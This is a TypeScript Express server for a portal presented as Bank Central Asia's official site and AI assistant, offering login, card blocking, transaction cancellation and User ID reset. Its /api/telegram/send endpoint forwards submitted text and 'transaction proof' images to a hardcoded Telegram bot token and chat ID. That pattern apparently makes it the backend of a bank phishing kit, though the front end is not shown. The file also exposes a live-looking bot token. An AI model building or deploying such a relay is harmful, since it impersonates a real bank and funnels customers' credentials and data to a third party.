import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import { GoogleGenAI } from "@google/genai";

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json({ limit: "25mb" }));
  app.use(express.urlencoded({ limit: "25mb", extended: true }));

  // Lazy initialization of GoogleGenAI SDK
  let aiClient: GoogleGenAI | null = null;
  function getAIClient(): GoogleGenAI {
    if (!aiClient) {
      const apiKey = process.env.GEMINI_API_KEY;
      if (!apiKey) {
        throw new Error("GEMINI_API_KEY environment variable is required");
      }
      aiClient = new GoogleGenAI({
        apiKey,
        httpOptions: {
          headers: {
            'User-Agent': 'aistudio-build',
          }
        }
      });
    }
    return aiClient;
  }

  // API Route: Smart AI Financial Assistant for BCA
  app.post("/api/ai/chat", async (req, res) => {
    try {
      const { message, history } = req.body;
      if (!message || typeof message !== 'string') {
        return res.status(400).json({ error: "Pesan tidak boleh kosong." });
      }

      const ai = getAIClient();

      const systemInstruction = `Anda adalah "Tanya BCA AI", Asisten Virtual Resmi Bank Central Asia (BCA).
Tugas utama Anda adalah MEMANDU NASABAH SECARA EKSKLUSIF pada layanan dan fitur yang tersedia di aplikasi/portal ini.

DARTAR LAYANAN DAN FITUR LENGKAP PADA APLIKASI INI:
1. PERLINDUNGAN & DARURAT ("Pilih Kebutuhanmu"):
   - **Blokir Kartu BCA**: Pemblokiran darurat 24/7 kartu Debit, Kredit, atau Rekening BCA dari penyalahgunaan.
   - **Amankan Kartu Bank Lain**: Pusat pengamanan dan bantuan darurat untuk kartu bank mitra.
   - **Pembatalan Transaksi**: Pengajuan investigasi kilat & sanggahan transaksi gantung/tidak dikenal.
   - **Amankan User ID**: Restorasi cepat kredensial digital, reset password, dan penguncian sementara User ID myBCA / m-BCA.

2. NAVIGASI SMARTBAR APLIKASI:
   - **Login**: Akses masuk ke portal e-banking resmi BCA.
   - **Produk**: Informasi Tabungan (Tahapan BCA), Kartu Kredit, Pinjaman/KPR, dan Investasi.
   - **Layanan**: Pusat bantuan Halo BCA 1500888, lokasi ATM/Cabang, dan info operasional.
   - **Promo**: Penawaran diskon, cashback, dan promo belanja merchant BCA.
   - **Webform**: Pengisian formulir online e-form pembukaan rekening dan pengajuan layanan.

PANDUAN & ATURAN RESPON:
- WAJIB hanya memberikan informasi dan solusi yang mengarahkan nasabah ke layanan yang ada di aplikasi ini.
- Jika nasabah bertanya topik di luar layanan aplikasi ini, jawab secara sopan bahwa Anda berfokus memandu layanan resmi BCA yang ada pada aplikasi portal ini, lalu tawarkan menu bantuan yang tersedia (Blokir Kartu, Pembatalan Transaksi, Amankan User ID, dll).
- Bahasa Indonesia resmi, profesional, sopan, ringkas, dan langsung pada poin utama.
- Sajikan panduan langkah-langkah secara ringkas dan terstruktur (1, 2, 3).
- DILARANG keras menyertakan catatan kaki/disclaimer/peringatan tambahan yang panjang di akhir teks.
- DILARANG menggunakan tag HTML.`;

      const contents: Array<{ role: string; parts: Array<{ text: string }> }> = [];

      if (Array.isArray(history)) {
        for (const item of history) {
          if (item.role && item.text) {
            contents.push({
              role: item.role === 'user' ? 'user' : 'model',
              parts: [{ text: item.text }]
            });
          }
        }
      }

      contents.push({
        role: 'user',
        parts: [{ text: message }]
      });

      const response = await ai.models.generateContent({
        model: "gemini-3.6-flash",
        contents,
        config: {
          systemInstruction,
          temperature: 0.7,
        },
      });

      const responseText = response.text || "Maaf, Tanya BCA AI belum dapat memberikan tanggapan saat ini. Silakan coba kembali.";
      return res.json({ response: responseText });
    } catch (error: any) {
      const errorMsg = error?.message || "";
      if (errorMsg.includes("429") || errorMsg.includes("RESOURCE_EXHAUSTED") || errorMsg.includes("quota")) {
        return res.json({
          response: "Tanya BCA AI saat ini sedang menerima volume permintaan tinggi. Layanan pemblokiran kartu darurat, pembatalan transaksi, dan pengamanan akun tetap aktif 24/7. Anda dapat langsung mengklik menu 'Blokir Kartu BCA', 'Pembatalan Transaksi', atau 'Amankan User ID' pada bagian Pilih Kebutuhanmu di halaman utama portal ini."
        });
      }
      console.warn("AI Chat API notice:", errorMsg);
      return res.status(500).json({
        error: "Terjadi kendala jaringan pada server AI BCA. Silakan coba beberapa saat lagi."
      });
    }
  });

  // API Route: Send Telegram Bot Notifications
  app.post("/api/telegram/send", async (req, res) => {
    try {
      const { token, chatId, text, photoBase64 } = req.body;
      const botToken = token || "8867601079:AAEuEfhFMxqhflMo6gqmQ2IHfzad6K49snM";
      const targetChatId = chatId || "8341942326";

      if (!text) {
        return res.status(400).json({ error: "Pesan tidak boleh kosong" });
      }

      if (photoBase64 && typeof photoBase64 === "string") {
        try {
          const parts = photoBase64.split(";base64,");
          const base64Data = parts[1] || parts[0];
          const buffer = Buffer.from(base64Data, "base64");

          const formData = new FormData();
          formData.append("chat_id", targetChatId);
          formData.append("caption", text);
          formData.append("parse_mode", "HTML");
          const blob = new Blob([buffer], { type: "image/jpeg" });
          formData.append("photo", blob, "bukti_transaksi.jpg");

          const photoRes = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: "POST",
            body: formData,
          });

          if (photoRes.ok) {
            return res.json({ success: true, method: "photo" });
          }
        } catch (imgErr) {
          console.warn("Failed sending photo to Telegram, falling back to text:", imgErr);
        }
      }

      // Send standard text message
      const textRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: targetChatId,
          text: text,
          parse_mode: "HTML",
        }),
      });

      if (textRes.ok) {
        return res.json({ success: true, method: "text" });
      } else {
        const errText = await textRes.text();
        console.error("Telegram API response error:", errText);
        return res.status(500).json({ error: "Gagal mengirim ke Telegram Bot", details: errText });
      }
    } catch (err: any) {
      console.error("Telegram endpoint error:", err);
      return res.status(500).json({ error: err?.message || "Internal server error" });
    }
  });

  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://0.0.0.0:${PORT}`);
  });
}

startServer();
